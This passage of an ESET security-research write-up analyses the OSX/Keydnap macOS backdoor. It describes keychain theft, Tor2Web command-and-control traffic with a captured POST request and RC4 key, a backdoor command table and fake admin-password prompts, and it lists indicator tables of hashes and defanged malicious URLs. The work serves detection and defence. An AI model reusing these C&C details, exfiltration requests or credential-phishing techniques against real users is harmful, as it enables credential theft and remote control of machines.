<p>The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain. The author simply took a proof-of-concept example available on Github called <a href="https://github.com/juuso/keychaindump" target="_blank">Keychaindump</a>. It reads <span style="font-family: 'courier new', courier, monospace;">securityd</span>’s memory and searches for the decryption key for the user’s keychain. This process is described in a <a href="https://forensic.n0fate.com/wp-content/uploads/2012/07/Keychain-Analysis-with-Mac-OS-X-Memory-Forensics.pdf">paper by K. Lee and H. Koo</a>. One of the reasons we think the source was taken directly from Github is that the function names in the source code are the same in the Keydnap malware.</p>
<div id="attachment_81261" style="width: 364px" class="wp-caption aligncenter"><img class=" wp-image-81261" src="/wp-content/uploads/2016/07/dumpkeychain_functions-481x1024.png" alt="Figure 9: Function list of Keydnap backdoor. In green, functions from Keychaindump." width="354" height="754" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/dumpkeychain_functions-481x1024.png 481w, https://www.welivesecurity.com/wp-content/uploads/2016/07/dumpkeychain_functions-141x300.png 141w, https://www.welivesecurity.com/wp-content/uploads/2016/07/dumpkeychain_functions.png 644w" sizes="(max-width: 354px) 100vw, 354px" /><p class="wp-caption-text">Figure 9: Function list of Keydnap backdoor. In green, functions from Keychaindump</p></div>
<h3>C&amp;C communication</h3>
<p>Keydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&amp;C server. We’ve seen two onion addresses used in different samples:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">g5wcesdfjzne7255.onion</span> (Down)</li>
<li><span style="font-family: 'courier new', courier, monospace;">r2elajikcosf7zee.onion</span> (Alive at time of writing)</li>
</ul>
<p>The HTTP resource always starts with <span style="font-family: 'courier new', courier, monospace;">/api/osx/</span> and contains actions such as:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">/api/osx/started</span> to report the bot has just started</li>
<li><span style="font-family: 'courier new', courier, monospace;">/api/osx/keychain</span> to exfiltrate the content of the keychain</li>
<li><span style="font-family: 'courier new', courier, monospace;">/api/osx/get_task?bot_id={botid}&amp;version={version}</span> to request a task (described below)</li>
<li><span style="font-family: 'courier new', courier, monospace;">/api/osx/cmd_executed</span> to report a the output of a command that was executed</li>
<li><span style="font-family: 'courier new', courier, monospace;">/api/osx/task_complete?bot_id={botid}&amp;task_id={taskid}</span> to report a task was completed</li>
</ul>
<p>HTTP POST content has two fields: <span style="font-family: 'courier new', courier, monospace;">bot_id</span> and <span style="font-family: 'courier new', courier, monospace;">data</span>. The data field is encrypted with the RC4 key &#8220;<span style="font-family: 'courier new', courier, monospace;">u2RLhh+!LGd9p8!ZtuKcN</span>&#8221; without quotes. When exfiltrating the keychain, the <span style="font-family: courier new,courier,monospace;">keychain</span> field is used instead of <span style="font-family: courier new,courier,monospace;">data</span>.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6057cb13667ce661342295" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /api/osx/started HTTP/1.1
Host: r2elajikcosf7zee.onion.to
Accept: */*
Content-Length: 233
Content-Type: application/x-www-form-urlencoded

bot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;amp;data=psX0DKYB0u...5TximyY%2BQY%3D</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6057cb13667ce661342295-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057cb13667ce661342295-2">2</div><div class="crayon-num" data-line="crayon-6057cb13667ce661342295-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057cb13667ce661342295-4">4</div><div class="crayon-num" data-line="crayon-6057cb13667ce661342295-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057cb13667ce661342295-6">6</div><div class="crayon-num" data-line="crayon-6057cb13667ce661342295-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6057cb13667ce661342295-1"><span class="crayon-v">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">api</span><span class="crayon-o">/</span><span class="crayon-v">osx</span><span class="crayon-o">/</span><span class="crayon-e">started </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057cb13667ce661342295-2"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">r2elajikcosf7zee</span><span class="crayon-sy">.</span><span class="crayon-v">onion</span><span class="crayon-sy">.</span><span class="crayon-st">to</span></div><div class="crayon-line" id="crayon-6057cb13667ce661342295-3"><span class="crayon-v">Accept</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">/</span><span class="crayon-o">*</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057cb13667ce661342295-4"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">233</span></div><div class="crayon-line" id="crayon-6057cb13667ce661342295-5"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">application</span><span class="crayon-o">/</span><span class="crayon-v">x</span><span class="crayon-o">-</span><span class="crayon-v">www</span><span class="crayon-o">-</span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057cb13667ce661342295-6">&nbsp;</div><div class="crayon-line" id="crayon-6057cb13667ce661342295-7"><span class="crayon-v">bot_id</span><span class="crayon-o">=</span><span class="crayon-cn">9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8</span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-v">data</span><span class="crayon-o">=</span><span class="crayon-v">psX0DKYB0u</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-cn">5TximyY</span><span class="crayon-o">%</span><span class="crayon-cn">2BQY</span><span class="crayon-o">%</span><span class="crayon-cn">3D</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p></p>
<p style="text-align: center;">Figure 10: Malware sending initial information</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6057cb13667d3104261953" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&amp;gt; rc4decrypt(base64decode("psX0DKYB0u...5TximyY+QY="), "u2RLhh+!LGd9p8!ZtuKcN")
device_model=MacBookPro9,2
bot_version=1.3.5
build_name=elitef*ck
os_version=15.5.0
ip_address=4.5.6.7
has_root=0</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6057cb13667d3104261953-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057cb13667d3104261953-2">2</div><div class="crayon-num" data-line="crayon-6057cb13667d3104261953-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057cb13667d3104261953-4">4</div><div class="crayon-num" data-line="crayon-6057cb13667d3104261953-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057cb13667d3104261953-6">6</div><div class="crayon-num" data-line="crayon-6057cb13667d3104261953-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6057cb13667d3104261953-1"><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">rc4decrypt</span><span class="crayon-sy">(</span><span class="crayon-e">base64decode</span><span class="crayon-sy">(</span><span class="crayon-s">"psX0DKYB0u...5TximyY+QY="</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"u2RLhh+!LGd9p8!ZtuKcN"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057cb13667d3104261953-2"><span class="crayon-v">device_model</span><span class="crayon-o">=</span><span class="crayon-v">MacBookPro9</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span></div><div class="crayon-line" id="crayon-6057cb13667d3104261953-3"><span class="crayon-v">bot_version</span><span class="crayon-o">=</span><span class="crayon-cn">1.3.5</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057cb13667d3104261953-4"><span class="crayon-v">build_name</span><span class="crayon-o">=</span><span class="crayon-e ">elitef*</span><span class="crayon-e">ck</span></div><div class="crayon-line" id="crayon-6057cb13667d3104261953-5"><span class="crayon-v">os_version</span><span class="crayon-o">=</span><span class="crayon-cn">15.5.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057cb13667d3104261953-6"><span class="crayon-v">ip_address</span><span class="crayon-o">=</span><span class="crayon-cn">4.5.6.7</span></div><div class="crayon-line" id="crayon-6057cb13667d3104261953-7"><span class="crayon-v">has_root</span><span class="crayon-o">=</span><span class="crayon-cn">0</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<p style="text-align: center;">Figure 11: Decoded data sent to C&amp;C</p>
<p>The <span style="font-family: 'courier new', courier, monospace;">bot_id</span> is constructed by hashing the following values with SHA-256:</p>
<ol>
<li>The hardware UUID (<span style="font-family: 'courier new', courier, monospace;">IOPlatformUUID</span>)</li>
<li>The system serial number (<span style="font-family: 'courier new', courier, monospace;">IOPlatformSerialNumber</span>)</li>
<li>The model identifier of the Mac (e.g.: <span style="font-family: 'courier new', courier, monospace;">MacBookPro9,2</span>)</li>
</ol>
<p>Most actions are self-explanatory. The started command will send the following information to the C&amp;C:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">device_model</span>: the model identifier (e.g.: <span style="font-family: 'courier new', courier, monospace;">MacBookPro9,2</span>)</li>
<li><span style="font-family: 'courier new', courier, monospace;">bot_version</span>: version of Keydnap</li>
<li><span style="font-family: 'courier new', courier, monospace;">build_name</span>: the &#8220;build name&#8221; that was given by downloader</li>
<li><span style="font-family: 'courier new', courier, monospace;">os_version</span>: OS X or macOS kernel version</li>
<li><span style="font-family: 'courier new', courier, monospace;">ip_address</span>: external IP address as reported by ipify.org</li>
<li><span style="font-family: 'courier new', courier, monospace;">has_root</span>: 1 if executed as root, 0 otherwise</li>
</ul>
<h3>Backdoor commands</h3>
<p>The response to <span style="font-family: 'courier new', courier, monospace;">get_task</span> contains an integer to identify the type of command and optional arguments. The function named <span style="font-family: 'courier new', courier, monospace;">get_and_execute_tasks</span> handles 10 different command types.</p>

<table id="tablepress-232" class="tablepress tablepress-id-232">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Command ID</th><th class="column-2">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">0</td><td class="column-2">Uninstall Keydnap and quit</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">1</td><td class="column-2">Update the backdoor from a base64-encoded file</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">2</td><td class="column-2">Update the backdoor given a URL</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">3</td><td class="column-2">Decode and execute a base64-encoded file</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">4</td><td class="column-2">Decode and execute a base64-encoded Python script</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">5</td><td class="column-2">Download and execute a file from a URL</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">6</td><td class="column-2">Download and execute a Python script from a URL</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">7</td><td class="column-2">Execute a command and report the output back to the C&amp;C server</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">8</td><td class="column-2">Request administrator privileges the next time the user runs an application</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">9</td><td class="column-2">Decode and execute, or stop, a base64-encoded file calledauthd_service</td>
</tr>
</tbody>
</table>

<p>The last two commands stand out. The command with ID 8 must be sent while Keydnap isn’t running as root already. When issued, the backdoor will start monitoring the user’s process count. When two new processes are created within two seconds, Keydnap will spawn a window asking for the user’s credentials, exactly like the one OS X users usually see when an application requires admin privileges. If the victim falls for this and enters their credentials, the backdoor will henceforth run as root and the content of the victim’s keychain will be exfiltrated.</p>
<div id="attachment_81265" style="width: 677px" class="wp-caption aligncenter"><img class=" wp-image-81265" src="/wp-content/uploads/2016/07/request_root.png" alt="Figure 12: Code performing the process count check" width="667" height="377" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/request_root.png 934w, https://www.welivesecurity.com/wp-content/uploads/2016/07/request_root-300x170.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/request_root-768x434.png 768w" sizes="(max-width: 667px) 100vw, 667px" /><p class="wp-caption-text">Figure 12: Code performing the process count check</p></div>
<div id="attachment_81257" style="width: 610px" class="wp-caption aligncenter"><img class=" wp-image-81257" src="/wp-content/uploads/2016/07/auth_request-1024x635.png" alt="Figure 13: icloudsyncd requesting privileges" width="600" height="372" srcset="https://www.welivesecurity.com/wp-content/uploads/2016/07/auth_request-1024x635.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2016/07/auth_request-300x186.png 300w, https://www.welivesecurity.com/wp-content/uploads/2016/07/auth_request-768x476.png 768w, https://www.welivesecurity.com/wp-content/uploads/2016/07/auth_request-275x172.png 275w, https://www.welivesecurity.com/wp-content/uploads/2016/07/auth_request.png 1110w" sizes="(max-width: 600px) 100vw, 600px" /><p class="wp-caption-text">Figure 13: icloudsyncd requesting privileges</p></div>
<p>We do not know what the <span style="font-family: 'courier new', courier, monospace;">authd_service</span> executable managed by command ID 9 is, because we haven’t seen it used. It could be a third stage malware deployed to certain targets of interest.</p>
<h2>Conclusion</h2>
<p>There are a few missing pieces to this puzzle. We do not know at this point how Keydnap is distributed. Nor do we know how many victims there are out there.</p>
<p>Although there are multiple security mechanisms in place in OS X to mitigate malware, it’s possible to deceive the user into executing non-sandboxed malicious code by replacing the icon of a Mach-O file.</p>
<h2>IoCs</h2>
<h3>Samples</h3>
<h4>Downloader</h4>
<p>All downloaders listed below are detected as OSX/TrojanDownloader.Keydnap.A by ESET products.</p>

<table id="tablepress-233" class="tablepress tablepress-id-233">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Filename</th><th class="column-3">First seen on VirusTotal</th><th class="column-4">Backdoor download URL</th><th class="column-5">Decoy description or URL</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><samp>07cd177f5baf8c1bdbbae22f1e8f03f22dfdb148</samp></td><td class="column-2"><samp>"info_list.txt "</samp></td><td class="column-3">2016-05-09</td><td class="column-4">hxxp://dev.aneros.com/media/icloudsyncd</td><td class="column-5">"Most Common Interview Questions"</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><samp>78ba1152ef3883e63f10c3a85cbf00f2bb305a6a</samp></td><td class="column-2"><samp>"screenshot_2016-06-28-01.jpg "</samp></td><td class="column-3">2016-06-28</td><td class="column-4">hxxp://freesafesoft.com/icloudsyncd</td><td class="column-5">BlackHat-TDS Panel screenshot</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><samp>773a82343367b3d09965f6f09cc9887e7f8f01bf</samp></td><td class="column-2"><samp>"screenshot.jpg "</samp></td><td class="column-3">2016-05-07</td><td class="column-4">hxxp://dev.aneros.com/media/icloudsyncd</td><td class="column-5">Firefox 20 about screenshot</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><samp>dfdb38f1e3ca88cfc8e9a2828599a8ce94eb958c</samp></td><td class="column-2"><samp>"CVdetails.doc "</samp></td><td class="column-3">2016-05-03</td><td class="column-4">hxxp://lovefromscratch.ca/wp-admin/css/icloudsyncd</td><td class="column-5">hxxp://lovefromscratch.ca/wp-admin/CVdetails.doc</td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><samp>2739170ed195ff1b9f00c44502a21b5613d08a58</samp></td><td class="column-2"><samp>"CVdetails.doc "</samp></td><td class="column-3">2016-05-03</td><td class="column-4">hxxp://lovefromscratch.ca/wp-admin/css/icloudsyncd</td><td class="column-5">hxxp://lovefromscratch.ca/wp-admin/CVdetails.doc</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><samp>e9d4523d9116b3190f2068b1be10229e96f21729</samp></td><td class="column-2"><samp>"logo.jpg "</samp></td><td class="column-3">2016-06-02</td><td class="column-4">hxxp://dev.aneros.com/media/icloudsyncd</td><td class="column-5">sanelite logo</td>
</tr>
<tr class="row-8 even">
	<td class="column-1"><samp>7472102922f91a78268430510eced1059eef1770</samp></td><td class="column-2"><samp>"screenshot_9324 2.jpg "</samp></td><td class="column-3">2016-06-28</td><td class="column-4">hxxp://freesafesoft.com/icloudsyncd</td><td class="column-5">Some C&amp;C panel</td>
</tr>
</tbody>
</table>

<h4>Backdoor</h4>

<table id="tablepress-234" class="tablepress tablepress-id-234">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">ESET Detection name</th><th class="column-3">C&amp;C</th><th class="column-4">Version</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><samp>a4bc56f5ddbe006c9a68422a7132ad782c1aeb7b</samp></td><td class="column-2">OSX/Keydnap.A</td><td class="column-3">hxxps://g5wcesdfjzne7255.onion.to</td><td class="column-4">1.3.1</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><samp>abf99129e0682d2fa40c30a1a1ad9e0c701e14a4</samp></td><td class="column-2">OSX/Keydnap.A</td><td class="column-3">hxxps://r2elajikcosf7zee.onion.to</td><td class="column-4">1.3.5</td>
</tr>
</tbody>
</table>

<h3>Backdoor C&amp;C servers</h3>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">hxxps://g5wcesdfjzne7255.onion.to/</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">hxxps://r2elajikcosf7zee.onion.to/</span></li>
</ul>
<p>Keydnap’s IoCs are also available and updated on ESET’s <a href="https://github.com/eset/malware-ioc/tree/master/keydnap" target="_blank">malware-ioc Github repository</a>.</p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                    Marc-Etienne M.Léveillé                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2016-07-06 14:30:27">6 Jul 2016 - 02:30PM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="New OSX/Keydnap malware is hungry for credentials">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="New OSX/Keydnap malware is hungry for credentials">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="New OSX/Keydnap malware is hungry for credentials">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="New OSX/Keydnap malware is hungry for credentials">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
